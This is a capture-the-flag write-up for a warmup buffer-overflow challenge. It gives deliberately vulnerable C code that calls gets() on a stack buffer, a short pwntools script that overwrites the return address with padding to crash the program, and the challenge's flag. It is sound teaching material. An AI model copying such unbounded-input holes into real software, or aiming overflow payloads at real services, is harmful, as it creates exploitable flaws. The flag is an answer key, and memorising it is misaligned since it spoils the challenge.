# Buffman

Difficulty Level: Warmup
 
Time to step it up a notch, instead of overwriting variables, we shall attempt to overwrite the return address!
 
Connect via `nc challenge.ctf-fun.xyz 14007`

PS: Challenges in this category require a linux environment read [here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit?usp=sharing) for a guide to installing a linux VM

### Hints

- This challenge introduces return address overwriting, a very important step in buffer overflow which allows one to get code execution. [Here](https://docs.google.com/document/d/13RjL_RWibA9xYOKvSCXpTGG0D2ZYa3kDzprGNa8ypeA/edit#heading=h.r8ei6kb9yd9e)'s a nice writeup to get you familar with the rest of the challenges

## Deployment

```bash
cd service
sudo ./buffman.sh &
```

## Solution
Looking at the source code, we see that it runs `signal(SIGSEV, sigsev_handler)` which sets the handler for [segmantation fault](https://kb.iu.edu/d/aqsj) to the function `sigsev_handler`. We see that `sigsegv_handler` prints the flag for us so our goal is to cause a segmentation fault by crashing the program. The easiest way to do that is through overwriting the return address to cause an error. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  // Set up flag
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vulnerable(){
  char buf[64] = {0x00};

  printf("%s\n","All you got to do is overwrite my return address!");
  printf("%s %p\n", "Location of buf:", buf);
  printf("%s %p\n", "Value of return address:", __builtin_return_address(0));
  
  gets(buf);

  printf("%s %p\n", "Value of return address:", __builtin_return_address(0));
  printf("%s\n", "Are you the buffman we all need?");  
}

int main(int argc, char **argv){
  signal(SIGSEGV, sigsegv_handler);
  setvbuf(stdout, NULL, _IONBF, 0);

  vulnerable();
  return 0;
}
```

Use GDB to find the offset (76) using `pattern create 100` and pasting it into the input.

![image2](../screenshots/buffman/image2.png?raw=true "Image 2")

Afterwards, send a payload larger than that to overwrite the return address and crash the program


```python
"""

Objective of this is to figure learn how to overflow the buffer

first inspect the vulnerable application with gdb, afterwards disassemble the vulnerable function

find out where the buffer will be located (break at gets and look at esp value)

calculate the offet from ebp location

overflow the offset (ebp - buffer_location + 8)

"""

from pwn import *

sh = process("./buffman")
#sh = remote("challenge.ctf-fun.xyz", 14007)

offset = "A" * 76
ret_addr = "A" * 4

payload = offset + ret_addr

sh.sendline(payload)
sh.interactive()
```
### Flag
19C4{1ts_0v3r_64!}